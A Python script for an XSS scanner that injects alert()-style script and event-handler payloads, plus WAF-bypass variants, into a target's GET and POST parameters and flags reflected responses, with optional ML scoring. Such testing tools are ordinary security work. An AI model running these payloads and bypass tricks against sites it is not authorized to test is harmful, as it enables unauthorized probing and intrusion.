import json
import logging
import re
import threading
from urllib.parse import urljoin

import joblib
import numpy as np
import requests
import tensorflow as tf
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(filename="xss_scanner.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Load pre-trained ML and DL models for vulnerability scoring
try:
    model = joblib.load("xss_ml_model.pkl")  # Pre-trained ML model
    dl_model = tf.keras.models.load_model("xss_dl_model.h5")  # Deep learning model
except:
    model = None
    dl_model = None

# Common XSS payloads (Can be customized for WAF bypass)
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\" onmouseover=alert('XSS') \"",
    "<img src='x' onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<script>eval('alert(1)')</script>",
]

def waf_bypass_payloads():
    return [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
        "<sCrIpT>alert('XSS')</sCrIpT>",  # Case manipulation
        "<script>/*XSS*/alert('XSS')</script>",  # Comment obfuscation
    ]

def extract_forms(url, headers):
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    return forms

def ai_based_analysis(response_text):
    xss_patterns = [r"<script>.*?</script>", r"onerror=", r"onmouseover="]
    for pattern in xss_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def ml_vulnerability_score(payload, response_text):
    if model:
        features = np.array([[len(payload), len(response_text), response_text.count('<script>')]])
        score = model.predict(features)[0]
        return score
    return None

def dl_vulnerability_score(payload, response_text):
    if dl_model:
        features = np.array([[len(payload), len(response_text), response_text.count('<script>')]])
        score = dl_model.predict(features)[0][0]
        return score
    return None

def scan_xss_get(url, headers, report):
    print(f"Scanning {url} for XSS vulnerabilities (GET)...\n")
    for payload in PAYLOADS + waf_bypass_payloads():
        injected_url = url + payload
        response = requests.get(injected_url, headers=headers)
        
        if payload in response.text or ai_based_analysis(response.text):
            ml_score = ml_vulnerability_score(payload, response.text)
            dl_score = dl_vulnerability_score(payload, response.text)
            print(f"[!] Potential XSS detected at: {injected_url} | ML Score: {ml_score if ml_score else 'N/A'}, DL Score: {dl_score if dl_score else 'N/A'}")
            logging.info(f"XSS detected: {injected_url} | ML Score: {ml_score}, DL Score: {dl_score}")
            report.append({"method": "GET", "url": injected_url, "payload": payload, "ml_score": ml_score, "dl_score": dl_score})
        else:
            print(f"[-] No XSS detected for payload: {payload}")

def scan_xss_post(url, params, headers, report):
    print(f"Scanning {url} for XSS vulnerabilities (POST)...\n")
    for payload in PAYLOADS + waf_bypass_payloads():
        data = {key: payload for key in params.keys()}
        response = requests.post(url, data=data, headers=headers)
        
        if payload in response.text or ai_based_analysis(response.text):
            ml_score = ml_vulnerability_score(payload, response.text)
            dl_score = dl_vulnerability_score(payload, response.text)
            print(f"[!] Potential XSS detected in POST request to: {url} | ML Score: {ml_score if ml_score else 'N/A'}, DL Score: {dl_score if dl_score else 'N/A'}")
            logging.info(f"XSS detected in POST request: {url} | Payload: {payload} | ML Score: {ml_score}, DL Score: {dl_score}")
            report.append({"method": "POST", "url": url, "payload": payload, "ml_score": ml_score, "dl_score": dl_score})
        else:
            print(f"[-] No XSS detected for payload: {payload}")

def start_scan(url, method, params, headers):
    report = []
    forms = extract_forms(url, headers)
    print(f"[+] Found {len(forms)} forms on the page. Scanning them...")
    
    if method == "GET":
        scan_xss_get(url, headers, report)
    elif method == "POST":
        scan_xss_post(url, params, headers, report)
    else:
        print("Invalid method. Use GET or POST.")
    
    with open("xss_scan_report.json", "w") as report_file:
        json.dump(report, report_file, indent=4)
    print("\n[+] Scan complete. Report saved as 'xss_scan_report.json'.")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/search?q= for GET, http://example.com/login for POST): ")
    method = input("Enter request method (GET/POST): ").strip().upper()
    
    custom_headers = {}
    if input("Do you want to add custom headers? (yes/no): ").strip().lower() == "yes":
        while True:
            key = input("Header Key (or press Enter to stop): ")
            if not key:
                break
            value = input("Header Value: ")
            custom_headers[key] = value
    
    param_dict = {}
    if method == "POST":
        param_keys = input("Enter POST parameter keys (comma-separated): ").split(',')
        param_dict = {key.strip(): "" for key in param_keys}
    
    thread = threading.Thread(target=start_scan, args=(target_url, method, param_dict, custom_headers))
    thread.start()
    thread.join()
    
    print("\n[+] Scan complete. Check 'xss_scanner.log' and 'xss_scan_report.json' for details.")
